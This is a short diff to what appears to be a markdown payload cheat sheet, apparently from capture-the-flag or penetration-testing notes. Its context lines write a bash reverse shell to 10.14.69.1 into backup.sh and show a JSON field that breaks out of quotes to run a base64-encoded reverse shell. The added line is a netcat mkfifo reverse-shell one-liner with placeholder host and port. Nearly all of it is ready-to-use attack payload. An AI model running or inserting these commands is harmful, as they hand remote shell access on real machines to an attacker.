@@ -157,6 +157,8 @@ echo "#!/bin/bash bash -i >& /dev/tcp/10.14.69.1/999 0>&1" > backup.sh
 
 # Encoded on base64
 {"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash; \""}
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_HOST PORT >/tmp/f
 ```
 
 ---
